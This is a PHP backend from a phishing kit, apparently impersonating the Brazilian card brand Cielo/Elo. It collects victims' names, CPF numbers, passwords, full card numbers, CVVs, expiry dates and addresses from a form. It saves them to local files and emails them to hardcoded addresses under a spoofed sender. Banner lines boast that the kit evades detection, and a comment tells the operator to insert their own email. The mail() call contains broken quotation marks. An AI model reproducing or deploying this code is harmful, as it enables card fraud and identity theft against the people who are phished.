<?php

	$nome = $_POST['nome'];	
	$email = $_POST['email'];	
	$dia = $_POST['dia'];	
	$mes = $_POST['mes'];	
	$ano = $_POST['ano'];
	$cpf = $_POST['cpf'];
	$celular = $_POST['celular'];
	$senha = $_POST['senha'];
	$nome_card = $_POST['nome_card'];
	$num_card = $_POST['num_card'];
	$cvv = $_POST['cvv'];
	$bandeira = $_POST['bandeira'];
	$val_mes = $_POST['val_mes'];
	$val_ano = $_POST['val_ano'];
	$cep = $_POST['cep'];	
	$limite = $_POST['limite'];	
	$cidade = $_POST['cidade'];	
	$bairro = $_POST['bairro'];	
	$complemento = $_POST['complemento'];	
	$estado = $_POST['estado'];	
	$rua = $_POST['rua'];	
	$ip = $_SERVER["REMOTE_ADDR"];
	$hora=date("H:i:s");

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Chegando Cielo <chegando@elo.com.br>";
$conteudo ="<b>### Fake By Cj2014 ####</b><br>";
$conteudo.="<b>### 100% Indectable in SSL and Using Antipishing ###</b><br>";
$conteudo.="<b>IP: </b>$ip <br>";
$conteudo.="<b>Hora: </b>$hora <br>";
$conteudo.="<br>";
$conteudo.="<b>############ Dados ############</b><br>";
$conteudo.="<br>";
$conteudo.="<b>Nome: </b>$nome<br>";
$conteudo.="<b>E-mail: </b>$email<br>";
$conteudo.="<b>Data de Nascimento: </b>$dia/$mes/$ano<br>";
$conteudo.="<b>CPF: </b>$cpf<br>";
$conteudo.="<b>celular: </b>$celular<br>";
$conteudo.="<b>senha: </b>$senha<br>";
$conteudo.="<b>Nome no cartao: </b>$nome_card<br>";
$conteudo.="<b>Numero do cartao: </b>$num_card<br>";
$conteudo.="<b>CVV: </b>$cvv<br>";
$conteudo.="<b>Bandeira: </b>$bandeira<br>";
$conteudo.="<b>Validade do cartao: </b>$val_mes/$val_ano<br>";
$conteudo.="<b>Limite: </b>$limite<br>";
$conteudo.="<br>";
$conteudo.="<b>############ Dados Pessoais ############</b><br>";
$conteudo.="<br>";
$conteudo.="<b>CEP: </b>$cep<br>";
$conteudo.="<b>Cidade: </b>$cidade<br>";
$conteudo.="<b>Estado: </b>$estado<br>";
$conteudo.="<b>Rua: </b>$rua<br>";
$conteudo.="<b>Bairro: </b>$bairro<br>";
$conteudo.="<b>Complemento: </b>$complemento<br>";
$conteudo.="<br>";
$conteudo.="<b>############ Fake 2014 Full Indetectable ############</b><br>";

$h = date(" d-m-Y H-i-s");
$fp = fopen("salva/"."Chegando_Cielo"."$ip"."["."$h]".".txt", "a");
$escreve = fwrite($fp, $conteudo);
fclose($fp);

@mail(“freechoise@outlook.com.br“,woodtoy1@hotmail.com “ $ip - $hora [Cielo]", "$conteudo", $headers); // COLOQUE SEU EMAIL AQUI!	
?>